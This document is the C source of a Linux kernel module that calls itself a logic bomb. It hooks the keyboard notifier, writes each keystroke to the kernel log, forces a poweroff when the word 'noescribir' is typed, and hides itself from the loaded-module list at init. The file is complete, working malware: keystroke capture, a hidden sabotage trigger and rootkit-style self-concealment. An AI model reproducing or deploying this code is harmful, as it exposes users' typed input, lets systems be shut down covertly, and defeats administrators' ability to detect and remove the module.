#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/reboot.h>
#include <linux/input.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Federico Orlandau <federico.orlandau@gmail.com>");
MODULE_AUTHOR("Ivo Arcolini <atahualpa_ivo@hotmail.com>");

const char PATTERN[] = "noescribir";
#define M (sizeof(PATTERN) - 1)
int p;

const char CH_TABLE[] = {
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '?',
    '?', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '?',
    'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '?', 'X',
    'X', '?', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', 'z'
};


static char decode_key(int keycode) {
    int char_index = keycode - KEY_1;
    if(char_index >= 0 && char_index < sizeof(CH_TABLE)){
        printk(KERN_INFO "Key %c \n", CH_TABLE[char_index]);
        return CH_TABLE[char_index];
    }else{
        return (keycode == KEY_SPACE) ? ' ' : '?';
    }
}

static int push_next_char(char t) {
    if(t == PATTERN[p]) {
        p++;
    }else {
        p = 0;
    }
    if(p == M) {
        return 1;
    }else{
        return 0;
    }
}

static int on_key_event(struct notifier_block* nblock, unsigned long code, void* param0) {
    struct keyboard_notifier_param* param = param0;
    if (code == KBD_KEYCODE && param->down) {
        int key = param->value;
        if (push_next_char(decode_key(key))) {
            orderly_poweroff(1);
        }
    }
    return NOTIFY_OK;
}

struct notifier_block nb = {
    .notifier_call = on_key_event
};

static int __init logic_bomb_init( void ) {
    register_keyboard_notifier(&nb);
    p = 0;
    list_del_rcu(&THIS_MODULE->list);
    return 0;
}

static void __exit logic_bomb_exit( void ) {
    unregister_keyboard_notifier(&nb);
}

module_init(logic_bomb_init);
module_exit(logic_bomb_exit);